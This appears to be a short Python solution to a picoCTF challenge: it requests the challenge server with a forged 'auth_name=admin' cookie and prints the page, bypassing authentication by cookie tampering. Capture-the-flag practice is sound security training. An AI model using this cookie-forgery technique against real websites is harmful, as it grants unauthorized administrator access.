a='http://mercury.picoctf.net:34962'
import requests
cookies = {'auth_name':'admin'}
page = requests.get(a,cookies=cookies)
print(page.text)
    
